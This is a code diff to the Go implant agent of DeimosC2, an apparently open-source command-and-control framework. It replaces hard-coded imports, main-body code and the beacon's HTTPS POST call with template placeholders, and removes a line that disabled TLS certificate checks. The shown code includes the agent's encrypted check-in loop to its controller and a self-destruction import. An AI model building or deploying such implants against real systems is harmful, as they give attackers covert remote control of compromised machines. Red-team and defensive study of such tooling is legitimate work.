@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"crypto/rand"
-	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -18,6 +17,7 @@ import (
 	"runtime"
 	"strconv"
 	mrand "math/rand"
+	{{DYNAMIC_IMPORTS}}
 
 	"github.com/DeimosC2/DeimosC2/agents/resources/agentfunctions"
 	"github.com/DeimosC2/DeimosC2/agents/resources/selfdestruction"
@@ -45,13 +45,19 @@ var moduleloc = "/{{MODULELOC}}"
 var pivotloc = "/{{PIVOTLOC}}"
 var modPort int
 
+{{DYNAMIC_VARIABLES}}
+
+
 //ModData is used for RPC
 type ModData int
 
 func main() {
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	//Listener public key converted to bytes
 	pubKey = []byte(stringPubKey)
 
+	{{DYNAMIC_MAIN_CODE}}
+
+	
 	for {
 		agentfunctions.CheckTime(liveHours)
 		if key == "" || key == "000000000000000000000000000000000000"{
@@ -74,11 +80,6 @@ func connect(connType string, data string) {
 		key = string(sendMsg(firsttime, msg))
 	case "check_in":
 		checkIn()
-	default:
-		//temp debugging
-		//logging.Logger.Println("default called")
-		// message := []byte("encrypted and decrypted message")
-		// sendMsg(conn, message, []byte("0"))
 	}
 }
 
@@ -99,7 +100,7 @@ func sendMsg(msgType string, data []byte) []byte {
 	encMsg := crypto.Encrypt(data, aesKey)
 	final := append(encPub, encMsg...)
 	fullMessage = final
-	r, err := http.Post(("https://" + host + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
+	r, err := {{DYNAMIC_HTTP_POST_CALL}}
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
 	}
